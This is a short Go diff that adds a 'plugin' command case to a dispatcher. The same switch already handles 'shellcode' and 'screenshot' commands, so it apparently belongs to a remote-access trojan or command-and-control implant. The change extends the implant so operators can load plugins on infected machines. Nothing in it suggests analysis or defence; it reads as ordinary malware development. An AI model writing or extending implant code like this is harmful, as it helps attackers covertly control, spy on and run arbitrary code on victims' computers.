@@ -47,6 +47,9 @@ func Start() {
 			case "shellcode":
 				go shellcodeCmd(sendUserId, decData)
 				break
+			case "plugin":
+				go pluginCmd(sendUserId, decData)
+				break
 			case "screenshot":
 				go screenCmd(sendUserId)
 				break
